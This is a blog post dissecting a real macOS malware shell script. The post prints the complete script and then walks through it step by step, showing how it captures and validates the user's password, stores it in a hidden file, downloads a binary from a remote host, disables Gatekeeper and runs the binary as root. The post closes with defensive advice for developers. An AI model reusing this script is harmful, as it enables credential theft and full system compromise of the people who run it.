---
layout: post
title: "Anatomy of a macOS Attack: Deconstructing a Malicious Shell Script"
date: 2025-07-20
tags: [security, macos, bash, devops, malware, incident]
description: "A chilling breakdown of a sophisticated macOS shell script attack, revealing how easily trust can be exploited for total system compromise. Learn to deconstruct and defend against similar threats."
image: "/assets/images/blog200725.png" # Path to the specific image for this blog post
og_type: "article" # Explicitly set for blog posts
---

## Introduction

As DevOps and backend engineers, we live in the terminal. We use `curl`, run installation scripts, and automate tasks with a level of trust in our tools. But this familiarity can lead to complacency. I recently came across a malicious script that serves as a chilling reminder of how easily that trust can be exploited to achieve total system compromise.

This script isn't just a proof-of-concept; it's a well-crafted piece of malware designed to trick a technical user into handing over their password and giving an attacker full root access. Let's break it down line-by-line.

## The Full Malicious Script

Here is the complete script captured from the attack. At first glance, some parts might look like a standard, albeit poorly written, installer. But the devil is in the details.

```bash
#!/bin/bash

BASE_URL="[https://wireshield.pro](https://wireshield.pro)"
mkdir -p ~/.autologin

echo "Please enter your password to continue installation"
CORRECT_PASS=""
while true; do
    echo -n "Password:"
    read -s USER_PASSWORD
    echo

    dscl /Local/Default -authonly ${SUDO_USER:-${USER}} $USER_PASSWORD > /dev/null 2>&1

    if [[ $? -eq 0 ]]; then
        echo "$USER_PASSWORD" > ~/.autologin/pass.txt
        CORRECT_PASS="$USER_PASSWORD"
        break
    else
        echo "Sorry, try again."
    fi
done

echo "$CORRECT_PASS" | sudo -S echo ""

arch=$(uname -m)

if [[ $arch == "x86_64" ]]; then
    URL="$BASE_URL/x64"
elif [[ $arch == "arm64" ]]; then
    URL="$BASE_URL/arm64"
else
    echo "Unknown architecture: $arch"
    exit 1
fi

FILE=$(basename "$URL")
echo "Downloading $FILE from $URL..."
curl -O "$URL"

if [ $? -ne 0 ]; then
    echo "Error downloading the file."
    exit 1
fi

sudo spctl --master-disable
echo "Running the application..."
chmod +x "$FILE"
sudo open "$FILE"
sudo spctl --master-enable
````

-----

## Step-by-Step Breakdown

Let's dissect what this script is actually doing.

### 1\. The Setup: Creating a Hiding Spot

```bash
BASE_URL="[https://wireshield.pro](https://wireshield.pro)"
mkdir -p ~/.autologin
```

The script starts by defining its command and control (C2) server. Then, it immediately creates a **hidden directory** (`.autologin`) in the user's home folder. Using a `.` prefix hides it from a standard `ls` command, making it a perfect place to stash stolen data.

### 2\. The Lure: The Password Prompt

```bash
while true; do
    echo -n "Password:"
    read -s USER_PASSWORD
    ...
done
```

This is pure **social engineering**. The script mimics a legitimate installer asking for administrative rights. The `read -s` command ensures the password isn't echoed to the terminal, adding to the illusion of a secure process.

### 3\. The Trick: Local Password Validation

```bash
dscl /Local/Default -authonly ${SUDO_USER:-${USER}} $USER_PASSWORD > /dev/null 2>&1
if [[ $? -eq 0 ]]; then
    ...
```

This is the most clever part of the script. It uses `dscl`, the native macOS Directory Service command-line utility, to **check if the password is correct**. The `-authonly` flag does this without actually logging in or changing users. Because it’s a legitimate system tool, it doesn't raise suspicion. The script then checks the exit code (`$?`). A `0` means success—the user entered the correct password.

### 4\. The Theft: Capturing the Credentials

```bash
echo "$USER_PASSWORD" > ~/.autologin/pass.txt
break
```

This is the moment the attack succeeds. Once the password is validated, the script **writes it in plain text** into the `pass.txt` file inside the hidden directory it created earlier. It now has the user's password.

### 5\. The Payload: Escalation and Execution

```bash
# Determine architecture (x86_64 or arm64) and download the binary
URL="$BASE_URL/x64" # or /arm64
curl -O "$URL"

# Disable Gatekeeper to run unverified apps
sudo spctl --master-disable

# Make the binary executable and run it with root privileges
chmod +x "$FILE"
sudo open "$FILE"

# Re-enable Gatekeeper to cover its tracks
sudo spctl --master-enable
```

With the password captured, the script proceeds to:

1.  Determine the Mac's architecture (`uname -m`).
2.  Download a malicious binary (`x64` or `arm64`) from the C2 server.
3.  **Disable Gatekeeper** (`spctl --master-disable`), macOS's core security feature that prevents unverified apps from running.
4.  **Run the malicious binary with `sudo`**, giving the attacker full root control.
5.  Finally, it re-enables Gatekeeper to hide the fact that system security settings were ever changed.

-----

## Key Takeaways for Developers

This script is a masterclass in exploiting trust and using a system's own tools against it.

  * **Never blindly trust an installer script.** The convenience of `curl | sh` is not worth the risk of total system compromise.
  * **Download and read first.** Always download a script to a local file and read every line before executing it. If you had read this one, the `echo "$USER_PASSWORD" > ...` line would have been a massive red flag.
  * **Question every password prompt.** A script asking for your main user password should be treated with extreme suspicion.
  * **Monitor your system.** Tools like `Little Snitch` can alert you to unexpected outgoing network connections, which could have flagged the download of the `x64` binary.

## References & Further Reading

  * This analysis is based on the incident bravely shared by a security professional. The original video detailing the attack can be found here: [I got hacked](https://www.youtube.com/watch?v=Y1BopTNVoZE).

## Conclusion

This attack highlights a critical vulnerability that isn't in the code, but in human behavior. As engineers, our comfort with the command line is an asset, but it can be turned against us. Stay skeptical, stay vigilant, and **always read the code**.
